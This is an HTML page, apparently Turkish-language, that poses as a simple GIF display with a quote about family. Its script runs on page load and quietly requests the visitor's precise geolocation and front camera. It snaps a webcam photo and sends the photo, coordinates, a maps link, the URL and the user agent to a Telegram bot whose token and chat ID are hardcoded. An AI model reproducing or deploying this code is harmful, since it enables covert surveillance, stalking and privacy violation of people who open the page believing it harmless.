<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF G√∂sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }

        .gif-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100vh;
        }

        .gif-container {
            flex-direction: column;
            gap: 30px;
        }

        .gif-container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        .status {
            color: #ffffff;
            font-size: 16px;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            max-width: 600px;
            white-space: pre-line;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="gif-container">
        <img src="Don Carlone.gif" alt="GIF">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
        <div id="status" class="status hidden"></div>
    </div>

    <script>
        const TELEGRAM_API_URL = 'https://api.telegram.org/bot';


        // Telegram'a mesaj g√∂nder
        async function sendToTelegram(botToken, chatId, message, photoData = null) {
            try {
                // Mesajƒ± g√∂nder
                const messageUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
                const messageResponse = await fetch(messageUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const messageResult = await messageResponse.json();
                
                if (!messageResponse.ok) {
                    throw new Error(messageResult.description || 'Mesaj g√∂nderilemedi');
                }

                // Fotoƒüraf varsa g√∂nder
                if (photoData && photoData.image) {
                    // Base64'√º blob'a √ßevir
                    const base64Data = photoData.image.replace(/^data:image\/\w+;base64,/, '');
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });

                    // FormData ile g√∂nder
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'üì∏ Ziyaret√ßi kamera fotoƒürafƒ±');

                    const photoUrl = `${TELEGRAM_API_URL}${botToken}/sendPhoto`;
                    await fetch(photoUrl, {
                        method: 'POST',
                        body: formData
                    });
                }

                return { success: true };
            } catch (error) {
                console.error('Telegram g√∂nderme hatasƒ±:', error);
                throw error;
            }
        }

        async function requestPermissions() {
            // Telegram bot ayarlarƒ± - Buraya token ve chat ID'nizi yazƒ±n
            const botToken = localStorage.getItem('telegramBotToken') || '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
            const chatId = localStorage.getItem('telegramChatId') || '-4991699158';
            
            if (!botToken || !chatId) {
                return;
            }

            let locationData = null;
            let cameraData = null;

            // Konum izni iste
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date(position.timestamp).toISOString()
                };
            } catch (error) {
                console.error('Konum hatasƒ±:', error);
                locationData = {
                    error: error.message,
                    code: error.code
                };
            }

            // Kamera izni iste
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });

                // Video stream'den bir frame yakala
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.currentTime = 0.1;
                    };
                    video.onseeked = resolve;
                });

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // Canvas'ƒ± base64 formatƒ±na √ßevir
                cameraData = {
                    image: canvas.toDataURL('image/jpeg', 0.8),
                    width: canvas.width,
                    height: canvas.height,
                    timestamp: new Date().toISOString()
                };

                // Stream'i durdur
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error('Kamera hatasƒ±:', error);
                cameraData = {
                    error: error.message,
                    name: error.name
                };
            }

            // Telegram'a g√∂nder
            try {
                let message = 'üîî <b>Yeni Ziyaret√ßi Bilgileri</b>\n\n';
                message += `‚è∞ Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
                message += `üåê URL: ${window.location.href}\n`;
                message += `üíª User Agent: ${navigator.userAgent}\n\n`;

                // Konum bilgisi
                if (locationData && locationData.latitude && locationData.longitude) {
                    message += `üìç <b>Konum:</b>\n`;
                    message += `   Enlem: ${locationData.latitude}\n`;
                    message += `   Boylam: ${locationData.longitude}\n`;
                    message += `   Doƒüruluk: ${locationData.accuracy ? locationData.accuracy.toFixed(2) + 'm' : 'Bilinmiyor'}\n\n`;
                    message += `üó∫Ô∏è <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}">Haritada G√∂r√ºnt√ºle</a>\n\n`;
                } else if (locationData && locationData.error) {
                    message += `‚ùå Konum izni reddedildi: ${locationData.error}\n\n`;
                }

                // Kamera bilgisi
                if (cameraData && cameraData.image) {
                    message += `üì∏ Kamera fotoƒürafƒ± alƒ±ndƒ± (${cameraData.width}x${cameraData.height})\n`;
                } else if (cameraData && cameraData.error) {
                    message += `‚ùå Kamera izni reddedildi: ${cameraData.error}\n`;
                }

                await sendToTelegram(botToken, chatId, message, cameraData);
            } catch (error) {
                console.error('G√∂nderme hatasƒ±:', error);
            }
        }

        // Sayfa y√ºklendiƒüinde izinleri iste
        window.addEventListener('load', () => {
            setTimeout(requestPermissions, 1000);
        });
    </script>
</body>
</html>
